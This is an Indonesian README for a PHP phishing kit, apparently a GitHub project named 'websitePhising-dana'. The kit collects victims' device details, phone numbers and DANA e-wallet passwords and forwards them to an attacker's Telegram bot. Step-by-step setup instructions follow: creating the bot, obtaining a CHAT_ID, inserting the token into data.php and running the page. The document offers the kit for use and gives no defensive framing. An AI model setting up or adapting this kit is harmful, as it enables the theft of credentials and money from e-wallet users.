# 📦 Proyek Web PHP + Bot Telegram
Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan data (Informasi perangkat, nomor, dan kata sandi Dana) ke Bot Telegram dan meneruskannya ke CHAT_ID yang ditentukan.

## 🔧 Kebutuhan
* Akun Telegram
* Bot Telegram (via BotFather)
* CHAT_ID tujuan

## 🛠️ Fitur
* Web berbasis PHP
* Mengirim data (teks, nomor, dan sandi.) ke Bot Telegram
* Data diteruskan ke chat tertentu melalui CHAT_ID


# 🚀 Cara Menjalankan Proyek Ini
## 1. Clone atau Download Proyek
bash

`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git`

`cd websitePhising-dana`

## 2. Buat Bot Telegram
Buka Telegram dan cari [https://t.me/Botfather]

Ketik /newbot dan ikuti petunjuk untuk membuat bot

Simpan TOKEN yang diberikan

## 3. Dapatkan CHAT_ID
Cari chat yang ingin menerima pesan (bisa chat pribadi atau grup

Gunakan bot seperti https://t.me/userinfobot untuk melihat CHAT_ID

Jika dikirim ke grup, pastikan bot sudah ditambahkan ke grup dan gunakan API getUpdates untuk melihat chat.id


## 4. Edit File data.php
php

`$id_telegram = "CHAT_ID_KAMU";`

`$id_botTele = "TOKEN_BOT_TELE_KAMU";`

## 5. Jalankan di Server Lokal (XAMPP/Laragon)
Letakkan proyek di folder htdocs (XAMPP) atau www (Laragon)

Jalankan server:

Buka browser: http://localhost/webPhising-dana/manyu/index.php

Cek Telegram — pesan akan muncul di chat!


Enjoy :)
